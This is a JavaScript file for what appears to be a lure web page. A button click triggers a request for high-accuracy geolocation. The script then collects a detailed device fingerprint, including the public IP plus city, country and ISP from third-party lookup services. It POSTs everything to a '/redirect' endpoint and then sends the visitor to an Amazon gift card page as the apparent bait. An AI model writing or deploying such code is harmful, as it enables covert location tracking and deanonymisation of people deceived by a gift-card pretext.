const button = document.getElementById('allowBtn');

button.addEventListener('click', async () => {
  if (!navigator.geolocation) {
    alert('Geolocation is not supported by your browser');
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const { latitude, longitude } = position.coords;

      try {
        // Collect device information
        const deviceInfo = await collectDeviceInfo();

        // Send location and device info to server for logging
        const response = await fetch('/redirect', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ 
            latitude, 
            longitude,
            deviceInfo 
          })
        });

        const data = await response.json();

        if (data.success) {
          // Redirect to Amazon gift card page
          window.location.href = 'https://www.amazon.in/Amazon-Grey-mail-Gift-Card/dp/B018TV9HIM/ref=sr_1_1?adgrpid=57361306457&dib=eyJ2IjoiMSJ9.y82CTWzb7183hfzqMUcWO7fNy618-mgz6PjmsofhcJy3HctgPhPoSwtkBHRL21eL1l1k_ACrAeB6WrJzlwpoCkK7VBa70TumIkbWT_VgRIKp9EA4x68foSO9wE2hMbhN4xmtUGa0OPSjzsQKnfYyNN4zQeERgNH3ejLkpJHq7U3Hbd_U5azYUhBrKUYUMHTPTzEGj3yXjiu3ma0FbaCgUySDjS-NAnT8LbPLv5UdPPjFzVqpe38jlrHTNKZZjsUewn5jv4fSrF9ibOr9Nx8klxjPypaKsa8sLmL53Bqy82M.3PjmEBTlClNlnxOCrnqEzcoF0SZ8ldH_MXWU9KQJi6w&dib_tag=se&ext_vrnc=hi&hvadid=590635198278&hvdev=c&hvlocphy=9062072&hvnetw=g&hvqmt=b&hvrand=20688313808831500&hvtargid=kwd-316981379938&hydadcr=14580_2262459&keywords=amazon%252Bgifts%252Bvoucher&mcid=b647ece39d0e37669d725b2206f4e73e&qid=1767189375&sr=8-1&th=1&gpo=2000';
        }
      } catch (err) {
        console.error('Error:', err);
      }
    },
    (error) => {
      // Location permission denied - do nothing, stay on blank page
      console.log('Location permission denied');
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
});

// Collect device information
async function collectDeviceInfo() {
  const info = {};

  // Operating System
  const userAgent = navigator.userAgent;
  info.userAgent = userAgent;
  
  if (userAgent.includes('Windows')) {
    info.operatingSystem = 'Windows';
  } else if (userAgent.includes('Mac')) {
    info.operatingSystem = 'macOS';
  } else if (userAgent.includes('Linux')) {
    info.operatingSystem = 'Linux';
  } else if (userAgent.includes('Android')) {
    info.operatingSystem = 'Android';
  } else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
    info.operatingSystem = 'iOS';
  } else {
    info.operatingSystem = navigator.platform || 'Unknown';
  }

  // Browser
  if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
    info.browser = 'Chrome';
  } else if (userAgent.includes('Firefox')) {
    info.browser = 'Firefox';
  } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
    info.browser = 'Safari';
  } else if (userAgent.includes('Edg')) {
    info.browser = 'Edge';
  } else {
    info.browser = 'Unknown';
  }

  // Screen Size
  info.screenSize = `${screen.width}x${screen.height} (${screen.width * screen.height} pixels)`;

  // CPU Cores
  info.cpuCores = navigator.hardwareConcurrency || 'Unknown';

  // CPU Info (from user agent if available)
  const cpuMatch = userAgent.match(/(x86_64|i386|i686|amd64|arm64|ARM)/i);
  info.cpuInfo = cpuMatch ? cpuMatch[0] : 'Unknown';

  // GPU Information
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
      } else {
        info.gpu = 'WebGL available but renderer info not accessible';
      }
    } else {
      info.gpu = 'WebGL not available';
    }
  } catch (e) {
    info.gpu = 'GPU info unavailable';
  }

  // Device Memory
  if (navigator.deviceMemory) {
    info.deviceMemory = navigator.deviceMemory;
  }

  // Language
  info.language = navigator.language || navigator.userLanguage || 'Unknown';

  // Timezone
  try {
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    info.timezone = timezone;
  } catch (e) {
    info.timezone = 'Unknown';
  }

  // Get IP and ISP information
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;
    info.ip = ip;

    // Get location and ISP info from IP
    try {
      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
      const geoData = await geoResponse.json();
      
      if (geoData.city) {
        info.city = geoData.city;
      }
      if (geoData.country_name) {
        info.country = geoData.country_name;
      }
      if (geoData.org) {
        info.isp = geoData.org;
      } else if (geoData.isp) {
        info.isp = geoData.isp;
      }
    } catch (e) {
      // Fallback to alternative API
      try {
        const geoResponse2 = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,country,isp,org`);
        const geoData2 = await geoResponse2.json();
        if (geoData2.status === 'success') {
          if (geoData2.city) info.city = geoData2.city;
          if (geoData2.country) info.country = geoData2.country;
          if (geoData2.isp) info.isp = geoData2.isp;
          else if (geoData2.org) info.isp = geoData2.org;
        }
      } catch (e2) {
        console.log('Could not fetch ISP info');
      }
    }
  } catch (e) {
    console.log('Could not fetch IP address');
  }

  return info;
}

// Fullscreen request function
function requestFullscreen() {
  const element = document.documentElement;
  
  if (element.requestFullscreen) {
    element.requestFullscreen().catch(err => {
      console.log('Fullscreen error:', err);
    });
  } else if (element.webkitRequestFullscreen) {
    element.webkitRequestFullscreen();
  } else if (element.webkitRequestFullScreen) {
    element.webkitRequestFullScreen();
  } else if (element.mozRequestFullScreen) {
    element.mozRequestFullScreen();
  } else if (element.msRequestFullscreen) {
    element.msRequestFullscreen();
  }
}
